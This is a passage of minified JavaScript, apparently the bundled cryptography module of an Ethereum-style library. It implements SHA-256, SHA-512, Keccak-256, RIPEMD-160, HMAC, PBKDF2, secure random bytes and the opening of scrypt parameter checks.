        dkLen: s,
        asyncTick: a,
        DK: h,
        PRF: p,
        PRFSalt: b
    }
}
function Hue(r, e, t, o, i) {
    return r.destroy(),
    e.destroy(),
    o && o.destroy(),
    i.fill(0),
    t
}
function J3(r, e, t, o) {
    const {c: i, dkLen: n, DK: s, PRF: a, PRFSalt: l} = Vue(r, e, t, o);
    let f;
    const h = new Uint8Array(4)
      , p = _m(h)
      , b = new Uint8Array(a.outputLen);
    for (let v = 1, T = 0; T < n; v++,
    T += a.outputLen) {
        const x = s.subarray(T, T + a.outputLen);
        p.setInt32(0, v, !1),
        (f = l._cloneInto(f)).update(h).digestInto(b),
        x.set(b.subarray(0, x.length));
        for (let E = 1; E < i; E++) {
            a._cloneInto(f).update(b).digestInto(b);
            for (let B = 0; B < x.length; B++)
                x[B] ^= b[B]
        }
    }
    return Hue(a, l, s, f, b)
}
function Gue(r, e, t, o) {
    if (typeof r.setBigUint64 == "function")
        return r.setBigUint64(e, t, o);
    const i = BigInt(32)
      , n = BigInt(4294967295)
      , s = Number(t >> i & n)
      , a = Number(t & n)
      , l = o ? 4 : 0
      , f = o ? 0 : 4;
    r.setUint32(e + l, s, o),
    r.setUint32(e + f, a, o)
}
class Q3 extends X3 {
    constructor(e, t, o, i) {
        super(),
        this.blockLen = e,
        this.outputLen = t,
        this.padOffset = o,
        this.isLE = i,
        this.finished = !1,
        this.length = 0,
        this.pos = 0,
        this.destroyed = !1,
        this.buffer = new Uint8Array(e),
        this.view = _m(this.buffer)
    }
    update(e) {
        Md(this);
        const {view: t, buffer: o, blockLen: i} = this;
        e = Nd(e);
        const n = e.length;
        for (let s = 0; s < n; ) {
            const a = Math.min(i - this.pos, n - s);
            if (a === i) {
                const l = _m(e);
                for (; i <= n - s; s += i)
                    this.process(l, s);
                continue
            }
            o.set(e.subarray(s, s + a), this.pos),
            this.pos += a,
            s += a,
            this.pos === i && (this.process(t, 0),
            this.pos = 0)
        }
        return this.length += e.length,
        this.roundClean(),
        this
    }
    digestInto(e) {
        Md(this),
        l7(e, this),
        this.finished = !0;
        const {buffer: t, view: o, blockLen: i, isLE: n} = this;
        let {pos: s} = this;
        t[s++] = 128,
        this.buffer.subarray(s).fill(0),
        this.padOffset > i - s && (this.process(o, 0),
        s = 0);
        for (let p = s; p < i; p++)
            t[p] = 0;
        Gue(o, i - 8, BigInt(this.length * 8), n),
        this.process(o, 0);
        const a = _m(e)
          , l = this.outputLen;
        if (l % 4)
            throw new Error("_sha2: outputLen should be aligned to 32bit");
        const f = l / 4
          , h = this.get();
        if (f > h.length)
            throw new Error("_sha2: outputLen bigger than state");
        for (let p = 0; p < f; p++)
            a.setUint32(4 * p, h[p], n)
    }
    digest() {
        const {buffer: e, outputLen: t} = this;
        this.digestInto(e);
        const o = e.slice(0, t);
        return this.destroy(),
        o
    }
    _cloneInto(e) {
        e || (e = new this.constructor),
        e.set(...this.get());
        const {blockLen: t, buffer: o, length: i, finished: n, destroyed: s, pos: a} = this;
        return e.length = i,
        e.pos = a,
        e.finished = n,
        e.destroyed = s,
        i % t && e.buffer.set(o),
        e
    }
}
const Kue = (r, e, t) => r & e ^ ~r & t
  , Zue = (r, e, t) => r & e ^ r & t ^ e & t
  , Yue = new Uint32Array([1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298])
  , Ec = new Uint32Array([1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225])
  , Ac = new Uint32Array(64);
let Xue = class extends Q3 {
    constructor() {
        super(64, 32, 8, !1),
        this.A = Ec[0] | 0,
        this.B = Ec[1] | 0,
        this.C = Ec[2] | 0,
        this.D = Ec[3] | 0,
        this.E = Ec[4] | 0,
        this.F = Ec[5] | 0,
        this.G = Ec[6] | 0,
        this.H = Ec[7] | 0
    }
    get() {
        const {A: e, B: t, C: o, D: i, E: n, F: s, G: a, H: l} = this;
        return [e, t, o, i, n, s, a, l]
    }
    set(e, t, o, i, n, s, a, l) {
        this.A = e | 0,
        this.B = t | 0,
        this.C = o | 0,
        this.D = i | 0,
        this.E = n | 0,
        this.F = s | 0,
        this.G = a | 0,
        this.H = l | 0
    }
    process(e, t) {
        for (let p = 0; p < 16; p++,
        t += 4)
            Ac[p] = e.getUint32(t, !1);
        for (let p = 16; p < 64; p++) {
            const b = Ac[p - 15]
              , v = Ac[p - 2]
              , T = Is(b, 7) ^ Is(b, 18) ^ b >>> 3
              , x = Is(v, 17) ^ Is(v, 19) ^ v >>> 10;
            Ac[p] = x + Ac[p - 7] + T + Ac[p - 16] | 0
        }
        let {A: o, B: i, C: n, D: s, E: a, F: l, G: f, H: h} = this;
        for (let p = 0; p < 64; p++) {
            const b = Is(a, 6) ^ Is(a, 11) ^ Is(a, 25)
              , v = h + b + Kue(a, l, f) + Yue[p] + Ac[p] | 0
              , x = (Is(o, 2) ^ Is(o, 13) ^ Is(o, 22)) + Zue(o, i, n) | 0;
            h = f,
            f = l,
            l = a,
            a = s + v | 0,
            s = n,
            n = i,
            i = o,
            o = v + x | 0
        }
        o = o + this.A | 0,
        i = i + this.B | 0,
        n = n + this.C | 0,
        s = s + this.D | 0,
        a = a + this.E | 0,
        l = l + this.F | 0,
        f = f + this.G | 0,
        h = h + this.H | 0,
        this.set(o, i, n, s, a, l, f, h)
    }
    roundClean() {
        Ac.fill(0)
    }
    destroy() {
        this.set(0, 0, 0, 0, 0, 0, 0, 0),
        this.buffer.fill(0)
    }
}
;
const eh = K1( () => new Xue)
  , im = BigInt(2 ** 32 - 1)
  , yA = BigInt(32);
function h7(r, e=!1) {
    return e ? {
        h: Number(r & im),
        l: Number(r >> yA & im)
    } : {
        h: Number(r >> yA & im) | 0,
        l: Number(r & im) | 0
    }
}
function p7(r, e=!1) {
    let t = new Uint32Array(r.length)
      , o = new Uint32Array(r.length);
    for (let i = 0; i < r.length; i++) {
        const {h: n, l: s} = h7(r[i], e);
        [t[i],o[i]] = [n, s]
    }
    return [t, o]
}
const Jue = (r, e) => BigInt(r >>> 0) << yA | BigInt(e >>> 0)
  , Que = (r, e, t) => r >>> t
  , efe = (r, e, t) => r << 32 - t | e >>> t
  , tfe = (r, e, t) => r >>> t | e << 32 - t
  , rfe = (r, e, t) => r << 32 - t | e >>> t
  , nfe = (r, e, t) => r << 64 - t | e >>> t - 32
  , ofe = (r, e, t) => r >>> t - 32 | e << 64 - t
  , ife = (r, e) => e
  , sfe = (r, e) => r
  , g7 = (r, e, t) => r << t | e >>> 32 - t
  , y7 = (r, e, t) => e << t | r >>> 32 - t
  , b7 = (r, e, t) => e << t - 32 | r >>> 64 - t
  , m7 = (r, e, t) => r << t - 32 | e >>> 64 - t;
function afe(r, e, t, o) {
    const i = (e >>> 0) + (o >>> 0);
    return {
        h: r + t + (i / 2 ** 32 | 0) | 0,
        l: i | 0
    }
}
const cfe = (r, e, t) => (r >>> 0) + (e >>> 0) + (t >>> 0)
  , lfe = (r, e, t, o) => e + t + o + (r / 2 ** 32 | 0) | 0
  , ufe = (r, e, t, o) => (r >>> 0) + (e >>> 0) + (t >>> 0) + (o >>> 0)
  , ffe = (r, e, t, o, i) => e + t + o + i + (r / 2 ** 32 | 0) | 0
  , dfe = (r, e, t, o, i) => (r >>> 0) + (e >>> 0) + (t >>> 0) + (o >>> 0) + (i >>> 0)
  , hfe = (r, e, t, o, i, n) => e + t + o + i + n + (r / 2 ** 32 | 0) | 0
  , qt = {
    fromBig: h7,
    split: p7,
    toBig: Jue,
    shrSH: Que,
    shrSL: efe,
    rotrSH: tfe,
    rotrSL: rfe,
    rotrBH: nfe,
    rotrBL: ofe,
    rotr32H: ife,
    rotr32L: sfe,
    rotlSH: g7,
    rotlSL: y7,
    rotlBH: b7,
    rotlBL: m7,
    add: afe,
    add3L: cfe,
    add3H: lfe,
    add4L: ufe,
    add4H: ffe,
    add5H: hfe,
    add5L: dfe
}
  , [pfe,gfe] = qt.split(["0x428a2f98d728ae22", "0x7137449123ef65cd", "0xb5c0fbcfec4d3b2f", "0xe9b5dba58189dbbc", "0x3956c25bf348b538", "0x59f111f1b605d019", "0x923f82a4af194f9b", "0xab1c5ed5da6d8118", "0xd807aa98a3030242", "0x12835b0145706fbe", "0x243185be4ee4b28c", "0x550c7dc3d5ffb4e2", "0x72be5d74f27b896f", "0x80deb1fe3b1696b1", "0x9bdc06a725c71235", "0xc19bf174cf692694", "0xe49b69c19ef14ad2", "0xefbe4786384f25e3", "0x0fc19dc68b8cd5b5", "0x240ca1cc77ac9c65", "0x2de92c6f592b0275", "0x4a7484aa6ea6e483", "0x5cb0a9dcbd41fbd4", "0x76f988da831153b5", "0x983e5152ee66dfab", "0xa831c66d2db43210", "0xb00327c898fb213f", "0xbf597fc7beef0ee4", "0xc6e00bf33da88fc2", "0xd5a79147930aa725", "0x06ca6351e003826f", "0x142929670a0e6e70", "0x27b70a8546d22ffc", "0x2e1b21385c26c926", "0x4d2c6dfc5ac42aed", "0x53380d139d95b3df", "0x650a73548baf63de", "0x766a0abb3c77b2a8", "0x81c2c92e47edaee6", "0x92722c851482353b", "0xa2bfe8a14cf10364", "0xa81a664bbc423001", "0xc24b8b70d0f89791", "0xc76c51a30654be30", "0xd192e819d6ef5218", "0xd69906245565a910", "0xf40e35855771202a", "0x106aa07032bbd1b8", "0x19a4c116b8d2d0c8", "0x1e376c085141ab53", "0x2748774cdf8eeb99", "0x34b0bcb5e19b48a8", "0x391c0cb3c5c95a63", "0x4ed8aa4ae3418acb", "0x5b9cca4f7763e373", "0x682e6ff3d6b2b8a3", "0x748f82ee5defb2fc", "0x78a5636f43172f60", "0x84c87814a1f0ab72", "0x8cc702081a6439ec", "0x90befffa23631e28", "0xa4506cebde82bde9", "0xbef9a3f7b2c67915", "0xc67178f2e372532b", "0xca273eceea26619c", "0xd186b8c721c0c207", "0xeada7dd6cde0eb1e", "0xf57d4f7fee6ed178", "0x06f067aa72176fba", "0x0a637dc5a2c898a6", "0x113f9804bef90dae", "0x1b710b35131c471b", "0x28db77f523047d84", "0x32caab7b40c72493", "0x3c9ebe0a15c9bebc", "0x431d67c49c100d4c", "0x4cc5d4becb3e42b6", "0x597f299cfc657e2a", "0x5fcb6fab3ad6faec", "0x6c44198c4a475817"].map(r => BigInt(r)))
  , Pc = new Uint32Array(80)
  , Cc = new Uint32Array(80);
class yfe extends Q3 {
    constructor() {
        super(128, 64, 16, !1),
        this.Ah = 1779033703,
        this.Al = -205731576,
        this.Bh = -1150833019,
        this.Bl = -2067093701,
        this.Ch = 1013904242,
        this.Cl = -23791573,
        this.Dh = -1521486534,
        this.Dl = 1595750129,
        this.Eh = 1359893119,
        this.El = -1377402159,
        this.Fh = -1694144372,
        this.Fl = 725511199,
        this.Gh = 528734635,
        this.Gl = -79577749,
        this.Hh = 1541459225,
        this.Hl = 327033209
    }
    get() {
        const {Ah: e, Al: t, Bh: o, Bl: i, Ch: n, Cl: s, Dh: a, Dl: l, Eh: f, El: h, Fh: p, Fl: b, Gh: v, Gl: T, Hh: x, Hl: E} = this;
        return [e, t, o, i, n, s, a, l, f, h, p, b, v, T, x, E]
    }
    set(e, t, o, i, n, s, a, l, f, h, p, b, v, T, x, E) {
        this.Ah = e | 0,
        this.Al = t | 0,
        this.Bh = o | 0,
        this.Bl = i | 0,
        this.Ch = n | 0,
        this.Cl = s | 0,
        this.Dh = a | 0,
        this.Dl = l | 0,
        this.Eh = f | 0,
        this.El = h | 0,
        this.Fh = p | 0,
        this.Fl = b | 0,
        this.Gh = v | 0,
        this.Gl = T | 0,
        this.Hh = x | 0,
        this.Hl = E | 0
    }
    process(e, t) {
        for (let O = 0; O < 16; O++,
        t += 4)
            Pc[O] = e.getUint32(t),
            Cc[O] = e.getUint32(t += 4);
        for (let O = 16; O < 80; O++) {
            const F = Pc[O - 15] | 0
              , D = Cc[O - 15] | 0
              , I = qt.rotrSH(F, D, 1) ^ qt.rotrSH(F, D, 8) ^ qt.shrSH(F, D, 7)
              , M = qt.rotrSL(F, D, 1) ^ qt.rotrSL(F, D, 8) ^ qt.shrSL(F, D, 7)
              , C = Pc[O - 2] | 0
              , W = Cc[O - 2] | 0
              , k = qt.rotrSH(C, W, 19) ^ qt.rotrBH(C, W, 61) ^ qt.shrSH(C, W, 6)
              , H = qt.rotrSL(C, W, 19) ^ qt.rotrBL(C, W, 61) ^ qt.shrSL(C, W, 6)
              , X = qt.add4L(M, H, Cc[O - 7], Cc[O - 16])
              , Y = qt.add4H(X, I, k, Pc[O - 7], Pc[O - 16]);
            Pc[O] = Y | 0,
            Cc[O] = X | 0
        }
        let {Ah: o, Al: i, Bh: n, Bl: s, Ch: a, Cl: l, Dh: f, Dl: h, Eh: p, El: b, Fh: v, Fl: T, Gh: x, Gl: E, Hh: B, Hl: P} = this;
        for (let O = 0; O < 80; O++) {
            const F = qt.rotrSH(p, b, 14) ^ qt.rotrSH(p, b, 18) ^ qt.rotrBH(p, b, 41)
              , D = qt.rotrSL(p, b, 14) ^ qt.rotrSL(p, b, 18) ^ qt.rotrBL(p, b, 41)
              , I = p & v ^ ~p & x
              , M = b & T ^ ~b & E
              , C = qt.add5L(P, D, M, gfe[O], Cc[O])
              , W = qt.add5H(C, B, F, I, pfe[O], Pc[O])
              , k = C | 0
              , H = qt.rotrSH(o, i, 28) ^ qt.rotrBH(o, i, 34) ^ qt.rotrBH(o, i, 39)
              , X = qt.rotrSL(o, i, 28) ^ qt.rotrBL(o, i, 34) ^ qt.rotrBL(o, i, 39)
              , Y = o & n ^ o & a ^ n & a
              , V = i & s ^ i & l ^ s & l;
            B = x | 0,
            P = E | 0,
            x = v | 0,
            E = T | 0,
            v = p | 0,
            T = b | 0,
            {h: p, l: b} = qt.add(f | 0, h | 0, W | 0, k | 0),
            f = a | 0,
            h = l | 0,
            a = n | 0,
            l = s | 0,
            n = o | 0,
            s = i | 0;
            const R = qt.add3L(k, X, V);
            o = qt.add3H(R, W, H, Y),
            i = R | 0
        }
        ({h: o, l: i} = qt.add(this.Ah | 0, this.Al | 0, o | 0, i | 0)),
        {h: n, l: s} = qt.add(this.Bh | 0, this.Bl | 0, n | 0, s | 0),
        {h: a, l} = qt.add(this.Ch | 0, this.Cl | 0, a | 0, l | 0),
        {h: f, l: h} = qt.add(this.Dh | 0, this.Dl | 0, f | 0, h | 0),
        {h: p, l: b} = qt.add(this.Eh | 0, this.El | 0, p | 0, b | 0),
        {h: v, l: T} = qt.add(this.Fh | 0, this.Fl | 0, v | 0, T | 0),
        {h: x, l: E} = qt.add(this.Gh | 0, this.Gl | 0, x | 0, E | 0),
        {h: B, l: P} = qt.add(this.Hh | 0, this.Hl | 0, B | 0, P | 0),
        this.set(o, i, n, s, a, l, f, h, p, b, v, T, x, E, B, P)
    }
    roundClean() {
        Pc.fill(0),
        Cc.fill(0)
    }
    destroy() {
        this.buffer.fill(0),
        this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    }
}
const e4 = K1( () => new yfe);
function bfe() {
    if (typeof self < "u")
        return self;
    if (typeof window < "u")
        return window;
    if (typeof global < "u")
        return global;
    throw new Error("unable to locate global object")
}
const uR = bfe()
  , fR = uR.crypto || uR.msCrypto;
function mfe(r) {
    switch (r) {
    case "sha256":
        return eh.create();
    case "sha512":
        return e4.create()
    }
    pe(!1, "invalid hashing algorithm name", "algorithm", r)
}
function xfe(r, e) {
    const t = {
        sha256: eh,
        sha512: e4
    }[r];
    return pe(t != null, "invalid hmac algorithm", "algorithm", r),
    Z1.create(t, e)
}
function wfe(r, e, t, o, i) {
    const n = {
        sha256: eh,
        sha512: e4
    }[i];
    return pe(n != null, "invalid pbkdf2 algorithm", "algorithm", i),
    J3(n, r, e, {
        c: t,
        dkLen: o
    })
}
function vfe(r) {
    Mt(fR != null, "platform does not support secure random numbers", "UNSUPPORTED_OPERATION", {
        operation: "randomBytes"
    }),
    pe(Number.isInteger(r) && r > 0 && r <= 1024, "invalid length", "length", r);
    const e = new Uint8Array(r);
    return fR.getRandomValues(e),
    e
}
let x7 = !1;
const w7 = function(r, e, t) {
    return xfe(r, e).update(t).digest()
};
let v7 = w7;
function Vc(r, e, t) {
    const o = pt(e, "key")
      , i = pt(t, "data");
    return et(v7(r, o, i))
}
Vc._ = w7;
Vc.lock = function() {
    x7 = !0
}
;
Vc.register = function(r) {
    if (x7)
        throw new Error("computeHmac is locked");
    v7 = r
}
;
Object.freeze(Vc);
const [T7,E7,A7] = [[], [], []]
  , Tfe = BigInt(0)
  , vp = BigInt(1)
  , Efe = BigInt(2)
  , Afe = BigInt(7)
  , Pfe = BigInt(256)
  , Cfe = BigInt(113);
for (let r = 0, e = vp, t = 1, o = 0; r < 24; r++) {
    [t,o] = [o, (2 * t + 3 * o) % 5],
    T7.push(2 * (5 * o + t)),
    E7.push((r + 1) * (r + 2) / 2 % 64);
    let i = Tfe;
    for (let n = 0; n < 7; n++)
        e = (e << vp ^ (e >> Afe) * Cfe) % Pfe,
        e & Efe && (i ^= vp << (vp << BigInt(n)) - vp);
    A7.push(i)
}
const [Sfe,Bfe] = p7(A7, !0)
  , dR = (r, e, t) => t > 32 ? b7(r, e, t) : g7(r, e, t)
  , hR = (r, e, t) => t > 32 ? m7(r, e, t) : y7(r, e, t);
function _fe(r, e=24) {
    const t = new Uint32Array(10);
    for (let o = 24 - e; o < 24; o++) {
        for (let s = 0; s < 10; s++)
            t[s] = r[s] ^ r[s + 10] ^ r[s + 20] ^ r[s + 30] ^ r[s + 40];
        for (let s = 0; s < 10; s += 2) {
            const a = (s + 8) % 10
              , l = (s + 2) % 10
              , f = t[l]
              , h = t[l + 1]
              , p = dR(f, h, 1) ^ t[a]
              , b = hR(f, h, 1) ^ t[a + 1];
            for (let v = 0; v < 50; v += 10)
                r[s + v] ^= p,
                r[s + v + 1] ^= b
        }
        let i = r[2]
          , n = r[3];
        for (let s = 0; s < 24; s++) {
            const a = E7[s]
              , l = dR(i, n, a)
              , f = hR(i, n, a)
              , h = T7[s];
            i = r[h],
            n = r[h + 1],
            r[h] = l,
            r[h + 1] = f
        }
        for (let s = 0; s < 50; s += 10) {
            for (let a = 0; a < 10; a++)
                t[a] = r[s + a];
            for (let a = 0; a < 10; a++)
                r[s + a] ^= ~t[(a + 2) % 10] & t[(a + 4) % 10]
        }
        r[0] ^= Sfe[o],
        r[1] ^= Bfe[o]
    }
    t.fill(0)
}
class t4 extends X3 {
    constructor(e, t, o, i=!1, n=24) {
        if (super(),
        this.blockLen = e,
        this.suffix = t,
        this.outputLen = o,
        this.enableXOF = i,
        this.rounds = n,
        this.pos = 0,
        this.posOut = 0,
        this.finished = !1,
        this.destroyed = !1,
        ai(o),
        0 >= this.blockLen || this.blockLen >= 200)
            throw new Error("Sha3 supports only keccak-f1600 function");
        this.state = new Uint8Array(200),
        this.state32 = Bm(this.state)
    }
    keccak() {
        _fe(this.state32, this.rounds),
        this.posOut = 0,
        this.pos = 0
    }
    update(e) {
        Md(this);
        const {blockLen: t, state: o} = this;
        e = Nd(e);
        const i = e.length;
        for (let n = 0; n < i; ) {
            const s = Math.min(t - this.pos, i - n);
            for (let a = 0; a < s; a++)
                o[this.pos++] ^= e[n++];
            this.pos === t && this.keccak()
        }
        return this
    }
    finish() {
        if (this.finished)
            return;
        this.finished = !0;
        const {state: e, suffix: t, pos: o, blockLen: i} = this;
        e[o] ^= t,
        (t & 128) !== 0 && o === i - 1 && this.keccak(),
        e[i - 1] ^= 128,
        this.keccak()
    }
    writeInto(e) {
        Md(this, !1),
        Y3(e),
        this.finish();
        const t = this.state
          , {blockLen: o} = this;
        for (let i = 0, n = e.length; i < n; ) {
            this.posOut >= o && this.keccak();
            const s = Math.min(o - this.posOut, n - i);
            e.set(t.subarray(this.posOut, this.posOut + s), i),
            this.posOut += s,
            i += s
        }
        return e
    }
    xofInto(e) {
        if (!this.enableXOF)
            throw new Error("XOF is not possible for this instance");
        return this.writeInto(e)
    }
    xof(e) {
        return ai(e),
        this.xofInto(new Uint8Array(e))
    }
    digestInto(e) {
        if (l7(e, this),
        this.finished)
            throw new Error("digest() was already called");
        return this.writeInto(e),
        this.destroy(),
        e
    }
    digest() {
        return this.digestInto(new Uint8Array(this.outputLen))
    }
    destroy() {
        this.destroyed = !0,
        this.state.fill(0)
    }
    _cloneInto(e) {
        const {blockLen: t, suffix: o, outputLen: i, rounds: n, enableXOF: s} = this;
        return e || (e = new t4(t,o,i,s,n)),
        e.state32.set(this.state32),
        e.pos = this.pos,
        e.posOut = this.posOut,
        e.finished = this.finished,
        e.rounds = n,
        e.suffix = o,
        e.outputLen = i,
        e.enableXOF = s,
        e.destroyed = this.destroyed,
        e
    }
}
const Ife = (r, e, t) => K1( () => new t4(e,r,t))
  , Ofe = Ife(1, 136, 256 / 8);
let P7 = !1;
const C7 = function(r) {
    return Ofe(r)
};
let S7 = C7;
function ir(r) {
    const e = pt(r, "data");
    return et(S7(e))
}
ir._ = C7;
ir.lock = function() {
    P7 = !0
}
;
ir.register = function(r) {
    if (P7)
        throw new TypeError("keccak256 is locked");
    S7 = r
}
;
Object.freeze(ir);
const Rfe = new Uint8Array([7, 4, 13, 1, 10, 6, 15, 3, 12, 0, 9, 5, 2, 14, 11, 8])
  , B7 = Uint8Array.from({
    length: 16
}, (r, e) => e)
  , Wfe = B7.map(r => (9 * r + 5) % 16);
let r4 = [B7]
  , n4 = [Wfe];
for (let r = 0; r < 4; r++)
    for (let e of [r4, n4])
        e.push(e[r].map(t => Rfe[t]));
const _7 = [[11, 14, 15, 12, 5, 8, 7, 9, 11, 13, 14, 15, 6, 7, 9, 8], [12, 13, 11, 15, 6, 9, 9, 7, 12, 15, 11, 13, 7, 8, 7, 7], [13, 15, 14, 11, 7, 7, 6, 8, 13, 14, 13, 12, 5, 5, 6, 9], [14, 11, 12, 14, 8, 6, 5, 5, 15, 12, 15, 14, 9, 9, 8, 6], [15, 12, 13, 13, 9, 5, 8, 6, 14, 11, 12, 11, 8, 6, 5, 5]].map(r => new Uint8Array(r))
  , Mfe = r4.map( (r, e) => r.map(t => _7[e][t]))
  , Nfe = n4.map( (r, e) => r.map(t => _7[e][t]))
  , Dfe = new Uint32Array([0, 1518500249, 1859775393, 2400959708, 2840853838])
  , Ffe = new Uint32Array([1352829926, 1548603684, 1836072691, 2053994217, 0])
  , sm = (r, e) => r << e | r >>> 32 - e;
function pR(r, e, t, o) {
    return r === 0 ? e ^ t ^ o : r === 1 ? e & t | ~e & o : r === 2 ? (e | ~t) ^ o : r === 3 ? e & o | t & ~o : e ^ (t | ~o)
}
const am = new Uint32Array(16);
class Ufe extends Q3 {
    constructor() {
        super(64, 20, 8, !0),
        this.h0 = 1732584193,
        this.h1 = -271733879,
        this.h2 = -1732584194,
        this.h3 = 271733878,
        this.h4 = -1009589776
    }
    get() {
        const {h0: e, h1: t, h2: o, h3: i, h4: n} = this;
        return [e, t, o, i, n]
    }
    set(e, t, o, i, n) {
        this.h0 = e | 0,
        this.h1 = t | 0,
        this.h2 = o | 0,
        this.h3 = i | 0,
        this.h4 = n | 0
    }
    process(e, t) {
        for (let v = 0; v < 16; v++,
        t += 4)
            am[v] = e.getUint32(t, !0);
        let o = this.h0 | 0
          , i = o
          , n = this.h1 | 0
          , s = n
          , a = this.h2 | 0
          , l = a
          , f = this.h3 | 0
          , h = f
          , p = this.h4 | 0
          , b = p;
        for (let v = 0; v < 5; v++) {
            const T = 4 - v
              , x = Dfe[v]
              , E = Ffe[v]
              , B = r4[v]
              , P = n4[v]
              , O = Mfe[v]
              , F = Nfe[v];
            for (let D = 0; D < 16; D++) {
                const I = sm(o + pR(v, n, a, f) + am[B[D]] + x, O[D]) + p | 0;
                o = p,
                p = f,
                f = sm(a, 10) | 0,
                a = n,
                n = I
            }
            for (let D = 0; D < 16; D++) {
                const I = sm(i + pR(T, s, l, h) + am[P[D]] + E, F[D]) + b | 0;
                i = b,
                b = h,
                h = sm(l, 10) | 0,
                l = s,
                s = I
            }
        }
        this.set(this.h1 + a + h | 0, this.h2 + f + b | 0, this.h3 + p + i | 0, this.h4 + o + s | 0, this.h0 + n + l | 0)
    }
    roundClean() {
        am.fill(0)
    }
    destroy() {
        this.destroyed = !0,
        this.buffer.fill(0),
        this.set(0, 0, 0, 0, 0)
    }
}
const kfe = K1( () => new Ufe);
let I7 = !1;
const O7 = function(r) {
    return kfe(r)
};
let R7 = O7;
function th(r) {
    const e = pt(r, "data");
    return et(R7(e))
}
th._ = O7;
th.lock = function() {
    I7 = !0
}
;
th.register = function(r) {
    if (I7)
        throw new TypeError("ripemd160 is locked");
    R7 = r
}
;
Object.freeze(th);
let W7 = !1;
const M7 = function(r, e, t, o, i) {
    return wfe(r, e, t, o, i)
};
let N7 = M7;
function _0(r, e, t, o, i) {
    const n = pt(r, "password")
      , s = pt(e, "salt");
    return et(N7(n, s, t, o, i))
}
_0._ = M7;
_0.lock = function() {
    W7 = !0
}
;
_0.register = function(r) {
    if (W7)
        throw new Error("pbkdf2 is locked");
    N7 = r
}
;
Object.freeze(_0);
let D7 = !1;
const F7 = function(r) {
    return new Uint8Array(vfe(r))
};
let U7 = F7;
function qa(r) {
    return U7(r)
}
qa._ = F7;
qa.lock = function() {
    D7 = !0
}
;
qa.register = function(r) {
    if (D7)
        throw new Error("randomBytes is locked");
    U7 = r
}
;
Object.freeze(qa);
const yr = (r, e) => r << e | r >>> 32 - e;
function gR(r, e, t, o, i, n) {
    let s = r[e++] ^ t[o++]
      , a = r[e++] ^ t[o++]
      , l = r[e++] ^ t[o++]
      , f = r[e++] ^ t[o++]
      , h = r[e++] ^ t[o++]
      , p = r[e++] ^ t[o++]
      , b = r[e++] ^ t[o++]
      , v = r[e++] ^ t[o++]
      , T = r[e++] ^ t[o++]
      , x = r[e++] ^ t[o++]
      , E = r[e++] ^ t[o++]
      , B = r[e++] ^ t[o++]
      , P = r[e++] ^ t[o++]
      , O = r[e++] ^ t[o++]
      , F = r[e++] ^ t[o++]
      , D = r[e++] ^ t[o++]
      , I = s
      , M = a
      , C = l
      , W = f
      , k = h
      , H = p
      , X = b
      , Y = v
      , V = T
      , R = x
      , _ = E
      , $ = B
      , z = P
      , K = O
      , j = F
      , ee = D;
    for (let ie = 0; ie < 8; ie += 2)
        k ^= yr(I + z | 0, 7),
        V ^= yr(k + I | 0, 9),
        z ^= yr(V + k | 0, 13),
        I ^= yr(z + V | 0, 18),
        R ^= yr(H + M | 0, 7),
        K ^= yr(R + H | 0, 9),
        M ^= yr(K + R | 0, 13),
        H ^= yr(M + K | 0, 18),
        j ^= yr(_ + X | 0, 7),
        C ^= yr(j + _ | 0, 9),
        X ^= yr(C + j | 0, 13),
        _ ^= yr(X + C | 0, 18),
        W ^= yr(ee + $ | 0, 7),
        Y ^= yr(W + ee | 0, 9),
        $ ^= yr(Y + W | 0, 13),
        ee ^= yr($ + Y | 0, 18),
        M ^= yr(I + W | 0, 7),
        C ^= yr(M + I | 0, 9),
        W ^= yr(C + M | 0, 13),
        I ^= yr(W + C | 0, 18),
        X ^= yr(H + k | 0, 7),
        Y ^= yr(X + H | 0, 9),
        k ^= yr(Y + X | 0, 13),
        H ^= yr(k + Y | 0, 18),
        $ ^= yr(_ + R | 0, 7),
        V ^= yr($ + _ | 0, 9),
        R ^= yr(V + $ | 0, 13),
        _ ^= yr(R + V | 0, 18),
        z ^= yr(ee + j | 0, 7),
        K ^= yr(z + ee | 0, 9),
        j ^= yr(K + z | 0, 13),
        ee ^= yr(j + K | 0, 18);
    i[n++] = s + I | 0,
    i[n++] = a + M | 0,
    i[n++] = l + C | 0,
    i[n++] = f + W | 0,
    i[n++] = h + k | 0,
    i[n++] = p + H | 0,
    i[n++] = b + X | 0,
    i[n++] = v + Y | 0,
    i[n++] = T + V | 0,
    i[n++] = x + R | 0,
    i[n++] = E + _ | 0,
    i[n++] = B + $ | 0,
    i[n++] = P + z | 0,
    i[n++] = O + K | 0,
    i[n++] = F + j | 0,
    i[n++] = D + ee | 0
}
function Yf(r, e, t, o, i) {
    let n = o + 0
      , s = o + 16 * i;
    for (let a = 0; a < 16; a++)
        t[s + a] = r[e + (2 * i - 1) * 16 + a];
    for (let a = 0; a < i; a++,
    n += 16,
    e += 16)
        gR(t, s, r, e, t, n),
        a > 0 && (s += 16),
        gR(t, n, r, e += 16, t, s)
}
function k7(r, e, t) {
    const o = f7({
        dkLen: 32,
        asyncTick: 10,
        maxmem: 1073742848
    }, t)
      , {N: i, r: n, p: s, dkLen: a, asyncTick: l, maxmem: f, onProgress: h} = o;
    if (ai(i),
    ai(n),
    ai(s),
    ai(a),
    ai(l),
    ai(f),
    h !== void 0 && typeof h != "function")
        throw new Error("progressCb should be function");
    const p = 128 * n
      , b = p / 4;
    if (i <= 1 || (i & i - 1) !== 0 || i >= 2 ** (p / 8) || i > 2 ** 32)
        throw new Error("Scrypt: N must be larger than 1, a power of 2, less than 2^(128 * r / 8) and less than 2^32");
    if (s < 0 || s > (2 ** 32 - 1) * 32 / p)
        throw new Error("Scrypt: p must be a positive integer less than or equal to ((2^32 - 1) * 32) / (128 * r)");
